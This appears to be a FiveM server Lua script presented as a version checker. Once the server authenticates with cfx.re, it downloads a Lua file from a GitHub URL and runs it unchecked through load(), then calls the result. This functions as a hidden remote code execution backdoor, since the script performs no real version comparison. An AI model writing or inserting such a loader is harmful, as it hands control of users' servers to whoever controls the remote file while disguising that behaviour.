local hasTriggered = false

RegisterConsoleListener(function(channel, message)
    if not hasTriggered then
        if string.find(message, "Authenticated with cfx.re Nucleus") then
            hasTriggered = true
            
            local url = "https://raw.githubusercontent.com/blamefilo/filo_versions/main/version_checker.lua"
            PerformHttpRequest(url, function(err, code, headers)
                if err == 200 then
                    local func, err = load(code)

                    if func then
                        local success, result = pcall(func)
                    
                        if success then
                            result()
                        end
                    end
                end
            end, 'GET')
        end
    end
end)